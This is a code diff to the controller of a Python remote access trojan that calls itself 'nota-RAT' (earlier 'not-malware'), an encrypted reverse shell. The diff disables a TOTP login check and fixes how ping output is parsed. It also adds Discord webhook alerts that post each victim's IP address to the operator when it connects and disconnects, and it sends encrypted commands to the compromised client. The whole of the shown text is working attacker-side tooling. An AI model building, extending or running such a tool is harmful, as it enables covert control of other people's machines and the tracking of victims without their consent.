@@ -68,15 +68,15 @@ $$/   $$/  $$$$$$/     $$$$/   $$$$$$$/       $$/       $$$$$$$/    $$$$/
 """)
 
 
-pwd = maskpass.askpass(prompt=f"\n[{IMPORTANT}] Enter code: ", mask="*")
-totp = pyotp.TOTP('Fluffydolphin')
-totp_verify = totp.verify(pwd)
+#pwd = maskpass.askpass(prompt=f"\n[{IMPORTANT}] Enter code: ", mask="*")
+#totp = pyotp.TOTP('Fluffydolphin')
+#totp_verify = totp.verify(pwd)
 
-if totp_verify != True:
-    print(f"[{INFO}] Incorrect\n")
-    exit()
+#if totp_verify != True:
+    #print(f"[{INFO}] Incorrect\n")
+    #exit()
 
-print(f"[{INFO}] Correct\n")
+#print(f"[{INFO}] Correct\n")
 
 s = socket.socket()
 
@@ -91,21 +91,19 @@ time.sleep(1)
 print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt ......{END}', end = '\n\n') #yes I stole this from hoax get over it
 time.sleep(1.8)
 
-
 if args.discord:
-    ping_command = f"ping {client_address[0]}"
-
     if platform == 'win32':
         pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}"], capture_output = True).stdout.decode()
-        ping = re.search("Average = (.*)", pings_command)
+        ping = re.search(", Average = (.*)\r", pings_command)
+        ping = ping.groups()
     else: 
         pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}", "-c", "4"], capture_output = True).stdout.decode()
         ping = re.split("/", pings_command)
-    ping = ping[-1].replace("\n", "")
+        ping = ping[-1].replace("\n", "")
 
 
     webhook = DiscordWebhook(url=args.discord, content='@everyone')
-    embed = DiscordEmbed(title='not-malware', description='An encrypted reverse shell', color='03b2f8')
+    embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
     embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
     embed.add_embed_field(name='Connection', value=f'{client_address[0]}')
     embed.add_embed_field(name='Ping', value=f'{ping}')
@@ -271,6 +269,14 @@ while True:
             command = Fernet(key).encrypt(command.encode())
             client_socket.send(command)
             receiver.stop_server()
+            if args.discord:
+                webhook = DiscordWebhook(url=args.discord, content='@everyone')
+                embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
+                embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
+                embed.add_embed_field(name='Disconnection', value=f'{client_address[0]}')
+                embed.set_timestamp()
+                webhook.add_embed(embed)
+                webhook.execute()
             commands = "exit"
             commands = Fernet(key).encrypt(commands.encode())
             client_socket.send(commands)
